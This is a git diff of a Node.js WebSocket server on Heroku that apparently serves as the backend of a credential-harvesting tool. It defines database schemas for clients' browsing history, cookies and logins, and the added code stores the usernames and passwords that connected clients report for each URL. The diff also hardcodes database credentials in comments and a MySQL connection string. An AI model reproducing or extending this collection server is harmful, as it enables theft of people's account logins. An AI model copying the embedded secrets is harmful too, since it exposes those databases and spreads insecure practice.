@@ -1,5 +1,22 @@
 'use strict';
-//taskkill /F /IM node.exe
+/*
+URL = https://projectnickname123.herokuapp.com
+If recieveing port in use error
+type this in cmd
+taskkill /F /IM node.exe
+
+HELPFUL COMMANDS:
+heroku local =hosts the server locally user, access using localhost:5000 
+IMPORTANT: ALWAYSALWAYSALWAYSALWAYS test on locally before deploying onto heroku
+heroku open = opens the url of deployed app
+heroku logs --tail = shows logs of server
+
+To push and deploy to heroku and github
+git add .
+git commit -m "commit message"
+git push heroku master
+git push origin master
+*/
 const express = require('express');
 const SocketServer = require('ws').Server;
 const path = require('path');
@@ -20,10 +37,15 @@ const server = express()
 var app = express();
 const wss = new SocketServer({ server });
 
-var clientStatus = new mongoose.Schema({
+//TERMINOLOGY FOR MONGODB
+//collection=table
+//document=row
+
+var clientStatus = new mongoose.Schema({//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out in order to push data to db
     id: {type: Number},
     status: { type: String}
   });
+  /*
 var clientUsername = new mongoose.Schema({
     id: {type: Number},
     url: { type: String},
@@ -34,17 +56,33 @@ var clientPassword = new mongoose.Schema({
     url: { type: String},
     password: {type: String}
   });
+  */
 var clientHistory = new mongoose.Schema({
     id: {type: Number},
     url: { type: String},
     history: {type: [String]}
   });
+  
 var clientCookies = new mongoose.Schema({
     id: {type: Number},
     url: { type: String},
     name: {type: String},
     value: {type: String}
   });
+var clientLogin = new mongoose.Schema({
+    id: {type: Number},
+    url: {type: String},
+    username: {type: String},
+    password: {type: String}
+});
+
+/*MONGODB LOGIN
+host:ds037977.mlab.com
+port:mlab.com
+username:heroku_qk2c0q0j
+password:i45p143m9dfcn4ocn1urpduu5c
+database:heroku_qk2c0q0j
+*/
 
 
 mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
@@ -94,34 +132,40 @@ MongoClient.connect(url, function (err, db) {
     }
   });
   */
- mongoose.connect(uri, function (err, res) {
+
+
+ mongoose.connect(uri, function (err, res) {//connect to db
     if (err) {
     console.log ('ERROR connecting to: ' + uri + '. ' + err);
     } else {
     console.log ('Succeeded connected to: ' + uri);
     }
   });
-
+//var db = mongoose.connection;
 var onlineClientsIDS = [];
 
-wss.on('connection', function connection(ws) {
+var userStatus = mongoose.model('Client Status', clientStatus);
+var userLogin = mongoose.model('Login Info', clientLogin);
+//var userPassword = mongoose.model('Login Info', clientPassword);
+
+
+wss.on('connection', function connection(ws) {//Upon a connection from a client
     
     console.log('Client connected');
-    ws.on('message', function incoming(message) {
+    ws.on('message', function incoming(message) {//Upon a message from a client
 
         console.log('received: %s', message);
         //ws.send(message);
         try{
-        var data = JSON.parse(message);
+        var data = JSON.parse(message);//turn message into JSON
         } catch(e){//if data isint proper format
             console.log('wrong format detected')
             return;
         }
-        console.log(message);
-        ws.id = data.id;
+        //console.log(message);
+        ws.id = data.id;//get client id
         if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
             onlineClientsIDS.push(ws.id);
-            var userStatus = mongoose.model('Client status', clientStatus);
             var newUser = new userStatus ({
                 id: ws.id,
                 status : 'online'
@@ -132,19 +176,48 @@ wss.on('connection', function connection(ws) {
             console.log("id is already online");
 
         var type = data.type;
-        /*//RECIEVING DATA
-        if (type == 'history')//history list
 
-        if (type == 'cookie')//cookie
+        //if (type == 'history')//history list
 
-        if (type == 'username')//username
+        //if (type == 'cookie')//cookie
 
-        if (type == 'password')//password
-*/
+        if (type == 'username'){//if message is telling us that client typed in username
+            ws.url=data.url;//get url from message
+            ws.username=data.username;//get username from message
+            var newUsername = new userLogin ({
+                id: ws.id,
+                url: ws.url,
+                username: ws.username
+            });
+            userLogin.updateOne( { id: ws.id, url: ws.url }, 
+                { username : ws.username }, { upsert : true }, function (err, hotel) {
+                    //finds a document that matches id and url, if found, update username field
+                    //if not found add such document
+                console.log(newUsername+" sent to db");
+            } );
+            //newUsername.save(function (err) {if (err) console.log ('Error on save!')});
+        }
+
+        if (type == 'password'){//password
+            ws.url=data.url;
+            ws.password=data.password;
+            var newPassword = new userLogin ({
+                id: ws.id,
+                logins:[
+                    {
+                    url: ws.url,
+                    password: ws.password
+                    }
+                ]
+            });
+            newPassword.save(function (err) {if (err) console.log ('Error on save!')});
+            console.log(newPassword+" sent to db");
+        }
+
 
         //SENDING DATA
 
-        wss.clients.forEach(function each(client) {
+        wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
             if (client.readyState === WebSocket.OPEN) {
                 client.send(message);
             }
@@ -153,12 +226,12 @@ wss.on('connection', function connection(ws) {
 
     });
 
-    ws.on('close', function (){ 
+    ws.on('close', function (){ //when a client disconnects
         console.log('Client disconnected')});
         var index = onlineClientsIDS.indexOf(ws.id);
-        if (index > -1) {
+        if (index > -1) {//remove him from active clients array
             onlineClientsIDS.splice(index, 1);
         }
-        
+
             
 });
